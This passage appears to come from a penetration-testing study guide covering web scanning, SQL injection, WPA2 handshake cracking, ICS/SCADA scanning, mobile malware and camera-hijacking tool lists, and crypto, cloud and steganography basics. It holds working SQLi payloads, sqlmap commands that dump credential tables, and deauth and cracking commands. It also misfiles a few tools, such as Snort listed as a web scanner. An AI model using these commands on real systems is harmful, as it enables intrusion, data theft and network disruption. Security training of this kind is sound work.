- **Gobuster**: `gobuster dir -u <url> -w <wordlist-path>`
- **Nikto**: `nikto -h <url>`
- **ffuf** — fast web fuzzer for directories/parameters
- **wfuzz** — web application fuzzer

### Step-by-step: full web server assessment
1. Scan for open web ports: `nmap -p 80,443 -sV 192.168.1.30`.
2. Banner-grab manually: `nc 192.168.1.30 80` then type `GET / HTTP/1.0` and press Enter twice — note the `Server:` header.
3. Run Nikto for known vulnerabilities/misconfigurations: `nikto -h http://192.168.1.30`.
4. Brute-force hidden directories/files: `gobuster dir -u http://192.168.1.30 -w /usr/share/wordlists/dirb/common.txt`.
5. Inspect any discovered admin panels, backup files, or config files found by Gobuster/Nikto.
6. Run targeted Nmap NSE scripts for the specific server (e.g. `nmap -p80 --script http-vuln* 192.168.1.30`).
7. Document all findings (exposed paths, outdated software versions, missing security headers) in the assessment report.

---

## OWASP Top 10

**OWASP (Open Worldwide Application Security Project) Top 10** is a standard awareness list of the most critical web application security risks, updated periodically.

| 2021 | 2025 |
|---|---|
| Broken Access Control | Broken Access Control |
| Cryptographic Failures | Security Misconfiguration |
| Injection | Software Supply Chain Failures |
| Insecure Design | Cryptographic Failures |
| Security Misconfiguration | Injection |
| Vulnerable & Outdated Components | Insecure Design |
| Identification & Authentication Failures | Authentication Failures |
| Software & Data Integrity Failures | Software & Data Integrity Failures |
| Security Logging & Monitoring Failures | Logging & Alerting Failures |
| Server-Side Request Forgery (SSRF) | Mishandling of Exceptional Conditions |

### Web Application Security Scanners

- Syhunt Hybrid
- N-Stalker
- Qualys Community Edition
- Snort
- Wapiti
- WebScarab
- WPSec
- Skipfish
- Tinfoil web scanner
- OWASP ZAP — free, widely used web app security scanner/proxy
- SonarQube — static code analysis for security/quality
- **Burp Suite** — industry-standard web app testing proxy/scanner

### Web Application Firewalls

- Cloudflare Web Application Firewall (WAF)
- Imperva Web Application Firewall
- AppWall
- Qualys WAF
- Barracuda Web Application Firewall
- NetScaler WAF

### Misc Checks

- `wafw00f <URL>` → check the web application firewall
- `dig <URL>` → check the real IP address
- `lbd <URL>` → check load balancing

### Step-by-step: running an automated scan with OWASP ZAP
1. Open OWASP ZAP and enter the target URL in the "URL to attack" field.
2. Run **Automated Scan** (combines spidering + active scan).
3. Let the spider crawl the site to map all pages/endpoints.
4. Let the active scanner test each discovered endpoint against common vulnerability classes (XSS, SQLi, etc.).
5. Review the **Alerts** tab — findings are grouped by risk level (High/Medium/Low/Informational).
6. Click an alert to see the exact request/response and a description of the issue plus remediation guidance.
7. Export the report (HTML/PDF) for the assessment write-up.

---

## SQL Injection

**SQL Injection (SQLi)** exploits improperly sanitized user input to inject malicious SQL statements, allowing an attacker to read/modify a database, bypass authentication, or execute admin operations.

**Types:**
- **In-band SQLi** — Union-based (combines results via `UNION`), Error-based (reads DB errors to extract info)
- **Blind SQLi** — Boolean-based (true/false responses), Time-based (response delay indicates true/false)
- **Out-of-band SQLi** — relies on DB server making DNS/HTTP requests to exfiltrate data

Basic auth bypass payload:
```
'username' or 1=1--
```

**Tools:**
- **SQLmap** — automated SQL injection detection/exploitation tool
- **Havij** — GUI-based automated SQLi tool

### Examples

```
# Authentication bypass (typed into a login username field)
' or 1=1--

# Union-based: determine number of columns
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY 3--    (error here means the table has 2 columns)

# Union-based: extract data
' UNION SELECT username, password FROM users--
```

```bash
# SQLmap — test and exploit automatically
sqlmap -u "http://192.168.1.30/item.php?id=1" --dbs
sqlmap -u "http://192.168.1.30/item.php?id=1" -D shop --tables
sqlmap -u "http://192.168.1.30/item.php?id=1" -D shop -T users --dump
```

### Step-by-step: manual union-based SQLi, then automating with SQLmap
1. Find a parameter that interacts with the database, e.g. `item.php?id=1`.
2. Test for injection: append a single quote — `item.php?id=1'` — and look for a DB error, which confirms the input isn't sanitized.
3. Determine column count with `ORDER BY n--` increasing `n` until an error appears.
4. Use `UNION SELECT` with that many columns to find which columns reflect on the page: `item.php?id=-1 UNION SELECT 1,2,3--`.
5. Replace reflected column numbers with real queries, e.g. `UNION SELECT username,password,3 FROM users--`.
6. Once confirmed manually, hand it to SQLmap for full automation:
   ```bash
   sqlmap -u "http://192.168.1.30/item.php?id=1" --dbs
   sqlmap -u "http://192.168.1.30/item.php?id=1" -D shop -T users --dump
   ```
7. Document the vulnerable parameter and recommend parameterized queries/prepared statements as remediation.

---

## Wireless / Wi-Fi Hacking

Wireless security protocols (weakest to strongest): **WEP** (broken, easily crackable) → **WPA** → **WPA2** (most common, vulnerable to KRACK/handshake capture) → **WPA3** (current standard, stronger key exchange via SAE).

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0
sudo airodump-ng -w wifi -c 7 --bssid <bssid> wlan0

# DoS / deauth attack (capture handshake)
sudo aireplay-ng --deauth 0 -a <bssid> wlan0mon
# cap file will be saved after the handshake

sudo aircrack-ng wifi.cap -w /usr/share/wordlists/rockyou.txt
```

**Additional wireless tools:**
- **Wifite** — automates the aircrack-ng suite workflow
- **Reaver** — brute-forces WPS PINs to recover WPA/WPA2 passphrases
- **Fern Wifi Cracker** — GUI wireless auditing tool
- **Kismet** — wireless network detector/sniffer/IDS

### Step-by-step: capturing and cracking a WPA2 handshake (own lab AP)
1. Put the wireless adapter into monitor mode (kill conflicting processes first): `sudo airmon-ng check kill` then `sudo airmon-ng start wlan0`.
2. Scan for nearby networks and note the target's BSSID/channel: `sudo airodump-ng wlan0mon`.
3. Focus capture on the target AP and write to file: `sudo airodump-ng -w wifi -c <channel> --bssid <BSSID> wlan0mon`.
4. In a second terminal, force a client to reconnect (captures the 4-way handshake): `sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon`.
5. Watch the first terminal for `WPA handshake:` confirmation — the `.cap` file now contains the handshake.
6. Crack the passphrase offline: `sudo aircrack-ng wifi-01.cap -w /usr/share/wordlists/rockyou.txt`.
7. On success, aircrack-ng prints the recovered key.
8. Only perform this against a Wi-Fi network you own or are explicitly authorized to test.

---

## IoT / OT Malware

**IoT (Internet of Things)** devices are consumer/embedded network devices (cameras, sensors); **OT (Operational Technology)** refers to industrial control systems (ICS/SCADA) running physical processes (power grids, factories). Both have historically weak security and are high-value attack targets.

| IoT Malware | OT Malware |
|---|---|
| KmsdBot | Fuxnet |
| Wallingrab | Kapeka |
| NKAbuse | Abyss Locker |
| IoTroop | Lormeenergy |
| XorDdos | Pipedream / Industroyer V2 |

### Scanning ICS/SCADA Systems Using Nmap

```bash
nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p <port_list> <target ip>   # identify open ports & services

# Identify HMI system
nmap -Pn -sT -p 46824 <ip>

nmap -Pn -sT -p 102 --script=s7-info <ip>
nmap -Pn -sT -p 502 --script modbus-discover <ip>
nmap -Pn -sU -p 47808 --script bacnet-info <ip>
nmap -Pn -sU -p 44818 --script enip-info <ip>
nmap -Pn -sT -p 1911,4911 --script proconos-info <ip>
nmap -Pn -sT -p 9600 --script omron-info <ip>
nmap -Pn -sT -p 1962 --script pcworx-info <ip>
```

### Step-by-step: safely scanning an ICS/SCADA lab environment
1. Confirm you're on an isolated lab network — ICS scanning in production can crash fragile legacy equipment.
2. Use a slow, non-aggressive scan to minimize disruption: `nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p 102,502,47808,44818 192.168.1.50`.
3. If port 502 (Modbus) is open, run `nmap -Pn -sT -p 502 --script modbus-discover 192.168.1.50` to pull device identity/register info.
4. If port 102 (S7comm, Siemens PLC) is open, run the `s7-info` script to identify the PLC model/firmware.
5. Record identified protocols/devices (PLC, HMI, RTU) — these map directly to known ICS vulnerability databases (e.g. ICS-CERT advisories).
6. Never send write/control commands to a live ICS device outside an authorized, isolated test environment — doing so can cause physical equipment damage.

---

## Mobile Applications

### Camera / Mic Hijacking Tools
- Stormbreaker
- CamPhish
- CamHack
- E-Tool
- CamOver
- CamDamper

### Android Malware / iOS Malware

| Android Malware | iOS Malware |
|---|---|
| Mamont | GoldPickaxe |
| SecuriDropper | SpectralBlur |
| Dwphon | Mercenary Spyware |
| DogeRAT | LightSpy |
| Tambir | KingsPawn |
| SoumniBot | Pegasus |

### Static Analysis of Android APK
- MobSF — Mobile Security Framework (static + dynamic APK/IPA analysis)
- APK Toolkit
- Sixo Online Analyzer
- Java Decompiler
- **Jadx** — DEX-to-Java decompiler for Android

### Mobile Device Management Services (Spyware)
- Scalefusion MDM
- ManageEngine Mobile Device Manager Plus
- Microsoft Intune
- SOTI MobiControl
- AppTec 360
- Samf Pro

### Payload / Malware APK
- Fatrat
- AndroRAT

### Step-by-step: static analysis of an APK with MobSF
1. Install MobSF (Docker is easiest): `docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf`.
2. Open the web UI at `http://localhost:8000`.
3. Upload the target `.apk` file.
4. MobSF automatically decompiles it and runs static checks — review the **Security Score**, permissions requested, hardcoded secrets, and insecure API usage.
5. For deeper inspection, use **Jadx-GUI** to manually read decompiled Java source for suspicious network calls or embedded C2 addresses.
6. Cross-reference any permissions (e.g. `RECORD_AUDIO`, `CAMERA`, `READ_SMS`) against the app's stated purpose to flag potential spyware behavior.

---

## Cryptography (Supplementary)

**Cryptography** secures information by transforming it so only authorized parties can read it.
- **Symmetric encryption** — same key to encrypt/decrypt (AES, DES, 3DES) — fast, used for bulk data
- **Asymmetric encryption** — public/private key pair (RSA, ECC, Diffie-Hellman) — used for key exchange/digital signatures
- **Hashing** — one-way fixed-length digest (MD5, SHA-1, SHA-256) — used for integrity checks, not reversible
- **Digital signatures/certificates** — authenticate identity and integrity (PKI, X.509 certs)

**Tools:** OpenSSL, GPG/PGP, HashCalc, Cryptool

### Examples
```bash
# Generate an RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Hash a file with SHA-256
sha256sum file.txt

# Encrypt a file symmetrically with AES
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc
```

### Step-by-step: generating and using an RSA key pair to sign and verify a file
1. Generate a private key: `openssl genrsa -out private.pem 2048`.
2. Derive the matching public key: `openssl rsa -in private.pem -pubout -out public.pem`.
3. Sign a file with the private key: `openssl dgst -sha256 -sign private.pem -out file.sig file.txt`.
4. Verify the signature with the public key: `openssl dgst -sha256 -verify public.pem -signature file.sig file.txt` → prints `Verified OK` if the file hasn't been tampered with.
5. Separately, confirm integrity with a hash: `sha256sum file.txt` and compare the digest against a known-good value shared out-of-band.
6. Document which algorithm/key length was used — this matters for a CEH assessment report when flagging weak crypto (e.g. DES, MD5, SHA-1, short RSA keys) in a target system.

---

## Cloud Security (Supplementary)

Common cloud-specific risks: misconfigured storage buckets (S3), excessive IAM permissions, insecure APIs, shared responsibility model gaps, container/Kubernetes misconfigurations.

**Tools:** ScoutSuite, Prowler (AWS security auditing), Pacu (AWS exploitation framework), kube-hunter (Kubernetes penetration testing)

### Example
```bash
# Prowler — audit an AWS account against CIS benchmarks
prowler aws

# kube-hunter — scan a Kubernetes cluster for vulnerabilities
kube-hunter --remote <cluster-ip>
```

### Step-by-step: auditing an AWS account with Prowler
1. Install Prowler and configure AWS credentials for a read-only IAM role: `pip install prowler`.
2. Run a full account audit against CIS benchmarks: `prowler aws`.
3. Narrow the scan to a specific check group if needed, e.g. S3 bucket exposure: `prowler aws -c check_extras -g s3`.
4. Review the generated findings — look first at any publicly readable/writable S3 buckets, overly permissive IAM policies (e.g. `*:*`), and disabled logging (CloudTrail/GuardDuty).
5. Export the report (`-M html` or `-M json`) for the assessment write-up and prioritize remediation of Critical/High findings.
6. For a Kubernetes cluster, run `kube-hunter --remote <cluster-ip>` (or `--cidr` for a range) to enumerate exposed API server endpoints, then cross-check any findings against kube-bench for CIS Kubernetes benchmark compliance.

---

## Steganography (Supplementary)

**Steganography** hides data within other, innocuous-looking files (images, audio, video) so its existence itself is concealed — distinct from cryptography, which hides meaning but not existence.

**Tools:** OpenStego, Steghide, SilentEye, QuickStego

### Example
```bash
# Hide a secret file inside an image using Steghide
steghide embed -cf cover.jpg -ef secret.txt

# Extract the hidden file
steghide extract -sf cover.jpg
```

### Step-by-step: hiding and recovering data with Steghide
1. Pick a cover file with enough spare capacity (a larger JPEG/BMP/WAV holds more hidden data).
2. Embed the secret file, optionally with a passphrase: `steghide embed -cf cover.jpg -ef secret.txt -p "passphrase"`.
3. Confirm the cover file's info without extracting anything: `steghide info cover.jpg` (reports whether embedded data is present).
4. Extract the hidden data on the receiving end: `steghide extract -sf cover.jpg -p "passphrase"`.
5. To check whether a suspicious image might contain hidden data during an investigation, run `steghide info <file>` or a detection tool like `StegExpose`/`zsteg` (for PNG/BMP LSB analysis), since steganography doesn't announce itself.
